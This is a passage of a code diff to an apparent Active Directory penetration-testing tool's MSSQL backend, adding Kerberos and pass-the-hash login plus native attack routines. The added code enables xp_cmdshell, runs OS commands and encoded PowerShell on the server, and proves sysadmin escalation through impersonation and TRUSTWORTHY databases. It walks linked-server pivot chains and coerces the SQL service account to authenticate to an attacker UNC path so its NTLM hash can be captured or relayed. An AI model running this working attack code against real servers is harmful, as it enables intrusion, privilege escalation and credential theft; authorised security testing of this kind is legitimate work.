@@ -24,7 +24,24 @@ from adscan_internal.command_runner import (
     summarize_execution_result,
 )
 from adscan_internal.integrations.mssql.helpers import is_hash_authentication
+from adscan_internal.integrations.mssql.models import (
+    CommandExecution,
+    IdentityFingerprint,
+    ImpersonationGrant,
+    IntegrityHint,
+    LinkedServer,
+    PivotChain,
+    PivotHop,
+    PrivilegeSweep,
+    ServerLogin,
+    XpCmdshellStatus,
+    coalesce_permissions,
+)
+from adscan_internal.integrations.mssql import queries
 from adscan_internal.rich_output import mark_sensitive
+from adscan_internal.services.auth_error_classification import (
+    is_impacket_tds_kerberos_infra_error,
+)
 
 _EMPTY_LM_HASH = "aad3b435b51404eeaad3b435b51404ee"
 
@@ -55,11 +72,27 @@ class ImpacketMSSQLBackend:
         port: int = 1433,
         database: str = "master",
         client_factory: ClientFactory | None = None,
+        kerberos_target_hostname: str | None = None,
+        domain: str | None = None,
     ) -> None:
+        from adscan_internal.services._kerberos_spn import (
+            normalize_kerberos_target_hostname,
+        )
+
         self.host = str(host)
         self.port = int(port)
         self.database = str(database)
         self._client_factory = client_factory or self._default_client_factory
+        # Impacket builds the Kerberos SPN as ``MSSQLSvc/<remoteName>:<port>``
+        # from the third positional arg of ``tds.MSSQL(...)``. A short hostname
+        # or IP yields a ticket the server rejects (same pattern as LDAP/SMB).
+        # When no explicit FQDN is provided, fall back to ``host`` and promote
+        # via the shared helper when a domain is known.
+        self._kerberos_remote_name = (
+            normalize_kerberos_target_hostname(kerberos_target_hostname, domain)
+            or normalize_kerberos_target_hostname(self.host, domain)
+            or self.host
+        )
 
     @staticmethod
     def _default_client_factory(host: str, port: int, remote_name: str) -> Any:
@@ -77,66 +110,113 @@ class ImpacketMSSQLBackend:
         query: str,
         linked_server: str | None = None,
         timeout: int = 120,
+        use_kerberos: bool = False,
+        allow_ntlm_fallback: bool = False,
     ) -> NativeMSSQLQueryResult:
-        """Execute one T-SQL query and return structured output."""
+        """Execute one T-SQL query and return structured output.
+
+        When ``use_kerberos`` is True (and the credential is Windows auth),
+        Kerberos is used instead of NTLM. Defaults preserve legacy behavior.
+        """
         final_query = self._wrap_linked_query(query, linked_server)
-        client = self._client_factory(self.host, self.port, self.host)
-        self._set_socket_timeout(client, timeout)
         started_at = time.perf_counter()
-        try:
-            if not self._authenticate(
-                client,
-                domain=domain,
-                username=username,
-                secret=secret,
-            ):
-                return NativeMSSQLQueryResult(
+        final_error: Exception | None = None
+        auth_attempts = [use_kerberos]
+        if (
+            use_kerberos
+            and allow_ntlm_fallback
+            and not str(secret or "").strip().lower().endswith(".ccache")
+        ):
+            auth_attempts.append(False)
+        for attempt_use_kerberos in auth_attempts:
+            client = self._client_factory(
+                self.host, self.port, self._kerberos_remote_name
+            )
+            self._set_socket_timeout(client, timeout)
+            try:
+                if not self._authenticate(
+                    client,
+                    domain=domain,
+                    username=username,
+                    secret=secret,
+                    use_kerberos=attempt_use_kerberos,
+                ):
+                    return NativeMSSQLQueryResult(
+                        success=False,
+                        query=final_query,
+                        rows=[],
+                        stderr="Native MSSQL login failed.",
+                        error_message="Native MSSQL login failed.",
+                    )
+
+                rows = list(client.sql_query(final_query) or [])
+                stderr, _infos = self._collect_reply_messages(client)
+                stdout = self._rows_to_text(rows)
+                success = not bool(stderr.strip())
+                query_result = NativeMSSQLQueryResult(
+                    success=success,
+                    query=final_query,
+                    rows=rows,
+                    stdout=stdout,
+                    stderr=stderr,
+                    error_message=stderr or None,
+                )
+                self._log_query_debug(
+                    query=final_query,
+                    result=query_result,
+                    username=username,
+                    linked_server=linked_server,
+                    duration_seconds=time.perf_counter() - started_at,
+                )
+                return query_result
+            except Exception as exc:  # noqa: BLE001
+                final_error = exc
+                if attempt_use_kerberos and self._is_kerberos_infra_error(exc):
+                    print_info_debug(
+                        "[mssql_native] Kerberos infra error — retrying with NTLM"
+                    )
+                    with contextlib.suppress(Exception):
+                        client.disconnect()
+                    continue
+                query_result = NativeMSSQLQueryResult(
                     success=False,
                     query=final_query,
                     rows=[],
-                    stderr="Native MSSQL login failed.",
-                    error_message="Native MSSQL login failed.",
+                    stderr=str(exc),
+                    error_message=str(exc),
                 )
+                self._log_query_debug(
+                    query=final_query,
+                    result=query_result,
+                    username=username,
+                    linked_server=linked_server,
+                    duration_seconds=time.perf_counter() - started_at,
+                )
+                return query_result
+            finally:
+                with contextlib.suppress(Exception):
+                    client.disconnect()
 
-            rows = list(client.sql_query(final_query) or [])
-            stderr, _infos = self._collect_reply_messages(client)
-            stdout = self._rows_to_text(rows)
-            success = not bool(stderr.strip())
-            query_result = NativeMSSQLQueryResult(
-                success=success,
-                query=final_query,
-                rows=rows,
-                stdout=stdout,
-                stderr=stderr,
-                error_message=stderr or None,
-            )
-            self._log_query_debug(
-                query=final_query,
-                result=query_result,
-                username=username,
-                linked_server=linked_server,
-                duration_seconds=time.perf_counter() - started_at,
-            )
-            return query_result
-        except Exception as exc:  # noqa: BLE001
-            query_result = NativeMSSQLQueryResult(
-                success=False,
-                query=final_query,
-                rows=[],
-                stderr=str(exc),
-                error_message=str(exc),
-            )
-            self._log_query_debug(
-                query=final_query,
-                result=query_result,
-                username=username,
-                linked_server=linked_server,
-                duration_seconds=time.perf_counter() - started_at,
-            )
-            return query_result
-        finally:
-            with contextlib.suppress(Exception):
-                client.disconnect()
+        query_result = NativeMSSQLQueryResult(
+            success=False,
+            query=final_query,
+            rows=[],
+            stderr=str(final_error or "Native MSSQL login failed."),
+            error_message=str(final_error or "Native MSSQL login failed."),
+        )
+        self._log_query_debug(
+            query=final_query,
+            result=query_result,
+            username=username,
+            linked_server=linked_server,
+            duration_seconds=time.perf_counter() - started_at,
+        )
+        return query_result
+
+    @staticmethod
+    def _is_kerberos_infra_error(exc: BaseException) -> bool:
+        """Return True when a Kerberos MSSQL failure is infrastructure-related."""
+        return is_impacket_tds_kerberos_infra_error(exc)
 
     def execute_xp_cmdshell(
         self,
@@ -147,6 +227,8 @@ class ImpacketMSSQLBackend:
         command: str,
         linked_server: str | None = None,
         timeout: int = 300,
+        use_kerberos: bool = False,
+        allow_ntlm_fallback: bool = False,
     ) -> NativeMSSQLQueryResult:
         """Execute one operating-system command via ``xp_cmdshell``."""
         escaped_command = self._escape_tsql_literal(command)
@@ -164,6 +246,8 @@ class ImpacketMSSQLBackend:
             query=query,
             linked_server=wrapped_linked_server,
             timeout=timeout,
+            use_kerberos=use_kerberos,
+            allow_ntlm_fallback=allow_ntlm_fallback,
         )
         return NativeMSSQLQueryResult(
             success=result.success,
@@ -172,7 +256,9 @@ class ImpacketMSSQLBackend:
             stdout=result.stdout,
             stderr=result.stderr,
             error_message=result.error_message,
-            method="linked_xp_cmdshell_native" if linked_server else "xp_cmdshell_native",
+            method="linked_xp_cmdshell_native"
+            if linked_server
+            else "xp_cmdshell_native",
         )
 
     def execute_powershell(
@@ -184,6 +270,8 @@ class ImpacketMSSQLBackend:
         encoded_command: str,
         linked_server: str | None = None,
         timeout: int = 300,
+        use_kerberos: bool = False,
+        allow_ntlm_fallback: bool = False,
     ) -> NativeMSSQLQueryResult:
         """Execute one encoded PowerShell payload through ``xp_cmdshell``."""
         command = f"powershell.exe -EncodedCommand {encoded_command}"
@@ -194,6 +282,8 @@ class ImpacketMSSQLBackend:
             command=command,
             linked_server=linked_server,
             timeout=timeout,
+            use_kerberos=use_kerberos,
+            allow_ntlm_fallback=allow_ntlm_fallback,
         )
 
     def upload_file(
@@ -336,7 +426,11 @@ class ImpacketMSSQLBackend:
                 queries,
                 error_message=(
                     f"PowerShell base64 decode did not produce the target file '{remote_path}'. "
-                    + (f"Decode output: {_decode_stdout[:300]}" if _decode_stdout else "No decode output.")
+                    + (
+                        f"Decode output: {_decode_stdout[:300]}"
+                        if _decode_stdout
+                        else "No decode output."
+                    )
                 ),
             )
         cleanup_command = f'cmd /c del /f /q "{remote_b64_path}"'
@@ -394,7 +488,8 @@ class ImpacketMSSQLBackend:
                 rows=result.rows,
                 stdout=result.stdout,
                 stderr=result.stderr,
-                error_message=result.error_message or "Native MSSQL download returned no rows.",
+                error_message=result.error_message
+                or "Native MSSQL download returned no rows.",
                 method="openrowset_bulk_native",
             )
 
@@ -439,7 +534,9 @@ class ImpacketMSSQLBackend:
         success = all(entry.success for entry in results)
         if success and success_hint:
             combined_stdout = (
-                f"{combined_stdout}\n{success_hint}".strip() if combined_stdout else success_hint
+                f"{combined_stdout}\n{success_hint}".strip()
+                if combined_stdout
+                else success_hint
             )
         return NativeMSSQLQueryResult(
             success=success,
@@ -447,7 +544,9 @@ class ImpacketMSSQLBackend:
             rows=[],
             stdout=combined_stdout,
             stderr=combined_stderr,
-            error_message=None if success else (error_message or combined_stderr or None),
+            error_message=None
+            if success
+            else (error_message or combined_stderr or None),
             method=results[-1].method if results else None,
         )
 
@@ -458,8 +557,9 @@ class ImpacketMSSQLBackend:
         domain: str,
         username: str,
         secret: str,
+        use_kerberos: bool = False,
     ) -> bool:
-        """Authenticate against MSSQL using password, NTLM hash, or Kerberos cache."""
+        """Authenticate against MSSQL using password, NTLM hash, or Kerberos."""
         if str(secret or "").strip().lower().endswith(".ccache"):
             with self._temporary_kerberos_env(secret):
                 return bool(
@@ -474,6 +574,17 @@ class ImpacketMSSQLBackend:
 
         if is_hash_authentication(secret):
             hash_value = f"{_EMPTY_LM_HASH}:{secret}"
+            if use_kerberos and bool(domain):
+                return bool(
+                    client.kerberosLogin(
+                        self.database,
+                        username,
+                        "",
+                        domain,
+                        hashes=hash_value,
+                        useCache=False,
+                    )
+                )
             return bool(
                 client.login(
                     self.database,
@@ -482,6 +593,17 @@ class ImpacketMSSQLBackend:
                     domain,
                     hashes=hash_value,
                     useWindowsAuth=bool(domain),
+                )
+            )
+
+        if use_kerberos and bool(domain):
+            return bool(
+                client.kerberosLogin(
+                    self.database,
+                    username,
+                    secret,
+                    domain,
+                    useCache=False,
                 )
             )
 
@@ -591,7 +713,9 @@ class ImpacketMSSQLBackend:
                 summarize_execution_result(synthetic_result)
             )
             query_hash = hashlib.sha1((query or "").encode("utf-8")).hexdigest()[:12]
-            query_lines = len([line for line in (query or "").splitlines() if line.strip()])
+            query_lines = len(
+                [line for line in (query or "").splitlines() if line.strip()]
+            )
             print_info_debug(
                 "[mssql_native] Result: "
                 f"host={mark_sensitive(self.host, 'hostname')}, "
@@ -677,6 +801,870 @@ class ImpacketMSSQLBackend:
                 os.environ.pop("KRB5CCNAME", None)
             else:
                 os.environ["KRB5CCNAME"] = previous
+
+    # ------------------------------------------------------------------
+    # Native enumeration — replaces NetExec subprocess calls
+    # ------------------------------------------------------------------
+
+    def fingerprint_identity(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        timeout: int = 60,
+    ) -> IdentityFingerprint | None:
+        """Confirm the effective identity established by the login.
+
+        Returns ``None`` if the connection cannot complete or the server
+        rejects the credentials. Callers that want a hard failure should
+        wrap this with their own error handling — this method intentionally
+        never raises so it is safe to call as a probe.
+        """
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.IDENTITY_FINGERPRINT,
+            timeout=timeout,
+        )
+        if not result.success or not result.rows:
+            return None
+        row = result.rows[0]
+        return IdentityFingerprint(
+            login_name=str(row.get("login_name") or "").strip(),
+            system_user=str(row.get("system_user") or "").strip(),
+            original_login=str(row.get("original_login") or "").strip(),
+            server_name=str(row.get("server_name") or "").strip(),
+            server_version=str(row.get("server_version") or "").strip(),
+            product_version=str(row.get("product_version") or "").strip(),
+            edition=str(row.get("edition") or "").strip(),
+            current_database=str(row.get("current_database") or "").strip(),
+        )
+
+    def sweep_privileges(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        timeout: int = 90,
+    ) -> PrivilegeSweep | None:
+        """Build a one-shot privilege fingerprint for the current login.
+
+        Replaces what NetExec spreads across the ``mssql_priv``,
+        ``enum_links`` and ``enable_cmdshell`` modules with a sequence of
+        in-process queries against the same impacket TDS connection. The
+        whole sweep typically completes in under a second on a LAN.
+        """
+        identity = self.fingerprint_identity(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+        if identity is None:
+            return None
+
+        started_at = time.perf_counter()
+
+        is_sysadmin = self._scalar_bool(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.IS_SYSADMIN,
+            column="is_sysadmin",
+            timeout=timeout,
+        )
+
+        permissions_result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.EFFECTIVE_SERVER_PERMISSIONS,
+            timeout=timeout,
+        )
+        permissions = (
+            coalesce_permissions(permissions_result.rows)
+            if permissions_result.success
+            else ()
+        )
+
+        impersonate_result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.IMPERSONABLE_PRINCIPALS,
+            timeout=timeout,
+        )
+        impersonable = tuple(
+            str(row.get("name") or "").strip()
+            for row in impersonate_result.rows
+            if str(row.get("name") or "").strip()
+        )
+
+        xp_status, advanced_on = self._read_xp_cmdshell_state(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+
+        owned_dbs_result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.OWNED_DATABASES,
+            timeout=timeout,
+        )
+        owned = tuple(
+            str(row.get("database_name") or "").strip()
+            for row in owned_dbs_result.rows
+            if str(row.get("database_name") or "").strip()
+        )
+
+        trusted = ()
+        if is_sysadmin:
+            # sys.databases.is_trustworthy_on requires VIEW SERVER STATE,
+            # which non-sysadmins typically lack. Skipping the query for
+            # non-sysadmins avoids a noisy permission-denied message.
+            trusted_result = self.execute_query(
+                domain=domain,
+                username=username,
+                secret=secret,
+                query=queries.TRUSTED_DATABASES_OWNED_BY_SYSADMIN,
+                timeout=timeout,
+            )
+            trusted = tuple(
+                str(row.get("database_name") or "").strip()
+                for row in trusted_result.rows
+                if str(row.get("database_name") or "").strip()
+            )
+
+        linked_servers = self.enumerate_linked_servers(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+
+        return PrivilegeSweep(
+            identity=identity,
+            is_sysadmin=is_sysadmin,
+            server_permissions=permissions,
+            impersonable_principals=impersonable,
+            xp_cmdshell=xp_status,
+            show_advanced_options_enabled=advanced_on,
+            owned_databases=owned,
+            trustworthy_databases_owned_by_sysadmin=trusted,
+            linked_servers=linked_servers,
+            duration_seconds=time.perf_counter() - started_at,
+        )
+
+    def enumerate_linked_servers(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        timeout: int = 60,
+    ) -> tuple[LinkedServer, ...]:
+        """Return the linked servers reachable from the current connection.
+
+        Tries the rich ``sys.servers`` query first; falls back to
+        ``sp_linkedservers`` on permission errors. The login mapping is
+        merged on a best-effort basis — non-sysadmins frequently cannot
+        read ``sp_helplinkedsrvlogin`` and we render those rows without the
+        mapping rather than failing the whole enumeration.
+        """
+        detail = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.LINKED_SERVERS_DETAIL,
+            timeout=timeout,
+        )
+        rows: list[LinkedServer] = []
+        if detail.success and detail.rows:
+            for row in detail.rows:
+                name = str(row.get("linked_server") or "").strip()
+                if not name:
+                    continue
+                rows.append(
+                    LinkedServer(
+                        name=name,
+                        product=str(row.get("product") or "").strip(),
+                        provider=str(row.get("provider") or "").strip(),
+                        data_source=str(row.get("data_source") or "").strip(),
+                        rpc_out_enabled=_truthy(row.get("rpc_out")),
+                        data_access_enabled=_truthy(row.get("data_access")),
+                    )
+                )
+        else:
+            fallback = self.execute_query(
+                domain=domain,
+                username=username,
+                secret=secret,
+                query=queries.LINKED_SERVERS_BASIC,
+                timeout=timeout,
+            )
+            if fallback.success:
+                for row in fallback.rows:
+                    name = str(row.get("SRV_NAME") or row.get("name") or "").strip()
+                    if not name:
+                        continue
+                    rows.append(LinkedServer(name=name))
+
+        if not rows:
+            return ()
+
+        # Best-effort login map enrichment.
+        login_map = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.LINKED_SERVERS_LOGIN_MAP,
+            timeout=timeout,
+        )
+        if login_map.success and login_map.rows:
+            mapping: dict[str, list[tuple[str, str]]] = {}
+            for row in login_map.rows:
+                linked_name = str(row.get("Linked Server") or "").strip()
+                if not linked_name:
+                    continue
+                local = str(row.get("Local Login") or "").strip() or "—"
+                remote = str(row.get("Remote Login") or "").strip() or "—"
+                mapping.setdefault(linked_name, []).append((local, remote))
+            rows = [
+                LinkedServer(
+                    name=server.name,
+                    product=server.product,
+                    provider=server.provider,
+                    data_source=server.data_source,
+                    rpc_out_enabled=server.rpc_out_enabled,
+                    data_access_enabled=server.data_access_enabled,
+                    local_to_remote_logins=tuple(mapping.get(server.name, [])),
+                )
+                for server in rows
+            ]
+
+        return tuple(rows)
+
+    def enable_xp_cmdshell(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        linked_server: str | None = None,
+        timeout: int = 60,
+    ) -> NativeMSSQLQueryResult:
+        """Toggle ``xp_cmdshell`` on locally or on a linked server.
+
+        Sysadmin is required. The two-statement batch (``sp_configure
+        'show advanced options'`` + ``sp_configure 'xp_cmdshell'``) is sent
+        in one round-trip when running locally to minimise the chance of
+        leaving the server in a half-configured state.
+        """
+        if linked_server:
+            query = queries.enable_xp_cmdshell_on_link(linked_server)
+        else:
+            query = queries.ENABLE_XP_CMDSHELL
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=query,
+            timeout=timeout,
+        )
+        return NativeMSSQLQueryResult(
+            success=result.success,
+            query=result.query,
+            rows=result.rows,
+            stdout=result.stdout,
+            stderr=result.stderr,
+            error_message=result.error_message,
+            method="enable_xp_cmdshell_native" + ("_linked" if linked_server else ""),
+        )
+
+    def execute_command(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        command: str,
+        host: str | None = None,
+        linked_server: str | None = None,
+        timeout: int = 300,
+        use_kerberos: bool = False,
+        allow_ntlm_fallback: bool = False,
+    ) -> CommandExecution:
+        """Execute one OS command via ``xp_cmdshell`` and return evidence.
+
+        Wrapper around :meth:`execute_xp_cmdshell` that maps the raw query
+        result onto a :class:`CommandExecution` value. The returned record
+        is what the presentation layer renders, what the report writer
+        embeds as evidence, and what the attack-graph engine reads to
+        decide whether to insert a ``derived`` edge.
+        """
+        started_at = time.perf_counter()
+        raw = self.execute_xp_cmdshell(
+            domain=domain,
+            username=username,
+            secret=secret,
+            command=command,
+            linked_server=linked_server,
+            timeout=timeout,
+            use_kerberos=use_kerberos,
+            allow_ntlm_fallback=allow_ntlm_fallback,
+        )
+        integrity = _infer_integrity(raw.stdout, fallback_login=username)
+        return CommandExecution(
+            host=host or self.host,
+            command=command,
+            sql_executed=raw.query,
+            success=raw.success,
+            stdout=raw.stdout,
+            stderr=raw.stderr,
+            duration_seconds=time.perf_counter() - started_at,
+            via_linked_server=linked_server,
+            integrity_hint=integrity,
+            error_message=raw.error_message,
+        )
+
+    def discover_pivot_chain(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        max_hops: int = 4,
+        timeout: int = 60,
+    ) -> PivotChain:
+        """Walk linked servers up to ``max_hops`` and probe identity at each.
+
+        The walk is intentionally shallow: most real-world chains are 1-3
+        hops, and exploring deeper costs visible latency without surfacing
+        new findings. Each probed hop calls
+        :func:`queries.identity_fingerprint_at_link` so the UX can show the
+        effective login at every step.
+        """
+        identity = self.fingerprint_identity(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+        entry_label = (
+            identity.server_name if identity and identity.server_name else self.host
+        )
+        entry_login = identity.system_user if identity else username
+
+        local_xp_status, _ = self._read_xp_cmdshell_state(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+        local_is_admin = self._scalar_bool(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.IS_SYSADMIN,
+            column="is_sysadmin",
+            timeout=timeout,
+        )
+
+        hops: list[PivotHop] = [
+            PivotHop(
+                hop_index=0,
+                server_label=entry_label,
+                effective_login=entry_login,
+                is_sysadmin=local_is_admin,
+                xp_cmdshell=local_xp_status,
+                incoming_link=None,
+            )
+        ]
+
+        started_at = time.perf_counter()
+        cursor_login = entry_login
+        seen: set[str] = {entry_label.lower()}
+        next_links = self.enumerate_linked_servers(
+            domain=domain, username=username, secret=secret, timeout=timeout
+        )
+
+        for hop_index in range(1, max_hops + 1):
+            actionable = next((ls for ls in next_links if ls.is_actionable), None)
+            if actionable is None or actionable.name.lower() in seen:
+                break
+            seen.add(actionable.name.lower())
+
+            probe = self.execute_query(
+                domain=domain,
+                username=username,
+                secret=secret,
+                query=queries.identity_fingerprint_at_link(actionable.name),
+                timeout=timeout,
+            )
+            if not probe.success or not probe.rows:
+                hops.append(
+                    PivotHop(
+                        hop_index=hop_index,
+                        server_label=actionable.name,
+                        effective_login="(probe failed)",
+                        is_sysadmin=False,
+                        xp_cmdshell=XpCmdshellStatus.UNKNOWN,
+                        incoming_link=actionable.name,
+                    )
+                )
+                break
+
+            row = probe.rows[0]
+            hop_login = str(row.get("system_user") or "").strip() or cursor_login
+            cursor_login = hop_login
+
+            # Probing further linked servers from the remote side requires
+            # nested EXEC AT, which TDS does not support. We stop the walk
+            # here and present what we have. Future iterations can extend
+            # this via OPENQUERY chains for the deeper hops.
+            hops.append(
+                PivotHop(
+                    hop_index=hop_index,
+                    server_label=actionable.name,
+                    effective_login=hop_login,
+                    is_sysadmin=False,  # unknown without a per-hop IS_SRVROLEMEMBER
+                    xp_cmdshell=XpCmdshellStatus.UNKNOWN,
+                    incoming_link=actionable.name,
+                )
+            )
+            break
+
+        return PivotChain(
+            entry_server=entry_label,
+            hops=tuple(hops),
+            probed=True,
+            discovery_seconds=time.perf_counter() - started_at,
+        )
+
+    # ------------------------------------------------------------------
+    # Impersonation — EXECUTE AS LOGIN / USER probes
+    # ------------------------------------------------------------------
+
+    def probe_impersonation_to_sysadmin(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        target_login: str,
+        timeout: int = 30,
+    ) -> bool:
+        """Verify that ``EXECUTE AS LOGIN = target_login`` reaches sysadmin.
+
+        Returns ``True`` only when the wrapped ``IS_SRVROLEMEMBER`` runs
+        successfully under the impersonated context and reports sysadmin.
+        Reads as ``False`` on auth-error / permission-denied so callers
+        can treat it as a binary capability flag.
+        """
+        wrapped = queries.execute_as_login(target_login, queries.IS_SYSADMIN)
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=wrapped,
+            timeout=timeout,
+        )
+        if not result.success or not result.rows:
+            return False
+        return _truthy(result.rows[0].get("is_sysadmin"))
+
+    def probe_trustworthy_db_escalation(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        database: str,
+        impersonate_user: str = "dbo",
+        timeout: int = 30,
+    ) -> bool:
+        """Verify the trustworthy-database → sysadmin escalation path.
+
+        Switches to ``database``, runs ``EXECUTE AS USER = '<dbo>'``, and
+        checks ``IS_SRVROLEMEMBER('sysadmin')``. The classic GOAD path
+        (``arya.stark`` → ``msdb`` dbo → sysadmin) returns ``True`` here.
+        """
+        safe_db = str(database).replace("]", "]]")
+        wrapped = queries.execute_as_user(impersonate_user, queries.IS_SYSADMIN)
+        full = f"USE [{safe_db}]; {wrapped}"
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=full,
+            timeout=timeout,
+        )
+        if not result.success or not result.rows:
+            return False
+        return _truthy(result.rows[0].get("is_sysadmin"))
+
+    def execute_command_as_login(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        target_login: str,
+        command: str,
+        timeout: int = 120,
+    ) -> CommandExecution:
+        """Run one OS command via ``xp_cmdshell`` under ``EXECUTE AS LOGIN``.
+
+        Validates an end-to-end impersonation+execution chain in a single
+        round-trip: the SQL session impersonates ``target_login``, enables
+        ``xp_cmdshell`` if needed, runs the command, and reverts. Used to
+        prove that a low-priv principal with IMPERSONATE rights actually
+        reaches OS execution — the canonical samwell→sa win on GOAD.
+        """
+        safe_login = str(target_login).replace("'", "''")
+        escaped_command = self._escape_tsql_literal(command)
+        wrapped_query = (
+            f"EXECUTE AS LOGIN = '{safe_login}'; "
+            "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; "
+            "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; "
+            f"EXEC master..xp_cmdshell '{escaped_command}'; "
+            "REVERT;"
+        )
+        started_at = time.perf_counter()
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=wrapped_query,
+            timeout=timeout,
+        )
+        integrity = _infer_integrity(result.stdout, fallback_login=target_login)
+        return CommandExecution(
+            host=self.host,
+            command=command,
+            sql_executed=wrapped_query,
+            success=result.success,
+            stdout=result.stdout,
+            stderr=result.stderr,
+            duration_seconds=time.perf_counter() - started_at,
+            integrity_hint=integrity,
+            error_message=result.error_message,
+        )
+
+    def execute_command_as_user_in_db(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        database: str,
+        target_user: str,
+        command: str,
+        timeout: int = 120,
+    ) -> CommandExecution:
+        """Run an OS command through the trustworthy-database escalation path.
+
+        Switches into ``database``, impersonates ``target_user``, and runs
+        ``master..xp_cmdshell``. Only meaningful when the database has
+        ``TRUSTWORTHY ON`` and the impersonated user is mapped to a login
+        that owns the database — the canonical arya→msdb dbo path.
+        """
+        safe_db = str(database).replace("]", "]]")
+        safe_user = str(target_user).replace("'", "''")
+        escaped_command = self._escape_tsql_literal(command)
+        wrapped_query = (
+            f"USE [{safe_db}]; "
+            f"EXECUTE AS USER = '{safe_user}'; "
+            f"EXEC master..xp_cmdshell '{escaped_command}'; "
+            "REVERT;"
+        )
+        started_at = time.perf_counter()
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=wrapped_query,
+            timeout=timeout,
+        )
+        integrity = _infer_integrity(result.stdout, fallback_login=target_user)
+        return CommandExecution(
+            host=self.host,
+            command=command,
+            sql_executed=wrapped_query,
+            success=result.success,
+            stdout=result.stdout,
+            stderr=result.stderr,
+            duration_seconds=time.perf_counter() - started_at,
+            integrity_hint=integrity,
+            error_message=result.error_message,
+        )
+
+    # ------------------------------------------------------------------
+    # Catalog enumeration — server logins + impersonation grants
+    # ------------------------------------------------------------------
+
+    def enumerate_logins(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        timeout: int = 60,
+    ) -> tuple[ServerLogin, ...]:
+        """Return the full ``server_principals`` roster with privilege flags.
+
+        Mirror of impacket's ``mssqlclient.py enum_logins`` action. Only
+        sysadmin (or impersonated sysadmin) sees the full list; lower-priv
+        principals get a filtered view, which is itself useful intel.
+        """
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.ENUM_SERVER_LOGINS,
+            timeout=timeout,
+        )
+        if not result.success:
+            return ()
+        flag_columns = (
+            "sysadmin",
+            "securityadmin",
+            "serveradmin",
+            "setupadmin",
+            "processadmin",
+            "diskadmin",
+            "dbcreator",
+            "bulkadmin",
+        )
+        rows: list[ServerLogin] = []
+        for row in result.rows:
+            name = str(row.get("name") or "").strip()
+            if not name:
+                continue
+            rows.append(
+                ServerLogin(
+                    name=name,
+                    type_desc=str(row.get("type_desc") or "").strip(),
+                    is_disabled=_truthy(row.get("is_disabled")),
+                    flags={col: _truthy(row.get(col)) for col in flag_columns},
+                )
+            )
+        return tuple(rows)
+
+    def enumerate_impersonation_map(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        databases: tuple[str, ...] = (),
+        timeout: int = 60,
+    ) -> tuple[ImpersonationGrant, ...]:
+        """Collect every ``IMPERSONATE`` grant visible to the principal.
+
+        Server-level grants are always queried. Database-level grants are
+        queried only for the databases supplied in ``databases`` so the
+        caller controls the cost — typically the union of
+        ``OWNED_DATABASES`` and the trustworthy candidates.
+        """
+        grants: list[ImpersonationGrant] = []
+        server_result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.SERVER_LEVEL_IMPERSONATION_MAP,
+            timeout=timeout,
+        )
+        if server_result.success:
+            for row in server_result.rows:
+                grants.append(_grant_from_row(row))
+
+        for database in databases:
+            db_result = self.execute_query(
+                domain=domain,
+                username=username,
+                secret=secret,
+                query=queries.database_level_impersonation_map(database),
+                timeout=timeout,
+            )
+            if not db_result.success:
+                continue
+            for row in db_result.rows:
+                grants.append(_grant_from_row(row))
+
+        return tuple(grants)
+
+    # ------------------------------------------------------------------
+    # Coercion — xp_dirtree NTLM authentication trigger
+    # ------------------------------------------------------------------
+
+    def coerce_ntlm_via_xp_dirtree(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        attacker_unc: str,
+        timeout: int = 30,
+    ) -> NativeMSSQLQueryResult:
+        """Trigger an outbound SMB authentication via ``xp_dirtree``.
+
+        The SQL service account walks ``attacker_unc``, which forces an
+        NTLM authentication that an attacker can capture or relay.
+        Available to non-sysadmin principals — that is precisely why this
+        primitive is high-value for low-priv flows.
+        """
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=queries.xp_dirtree_unc(attacker_unc),
+            timeout=timeout,
+        )
+        return NativeMSSQLQueryResult(
+            success=result.success,
+            query=result.query,
+            rows=result.rows,
+            stdout=result.stdout,
+            stderr=result.stderr,
+            error_message=result.error_message,
+            method="xp_dirtree_native",
+        )
+
+    # ------------------------------------------------------------------
+    # Internal helpers
+    # ------------------------------------------------------------------
+
+    def _scalar_bool(
+        self,
+        *,
+        domain: str,
+        username: str,
+        secret: str,
+        query: str,
+        column: str,
+        timeout: int = 30,
+    ) -> bool:
+        """Return the first cell of a query coerced to bool."""
+        result = self.execute_query(
+            domain=domain,
+            username=username,
+            secret=secret,
+            query=query,
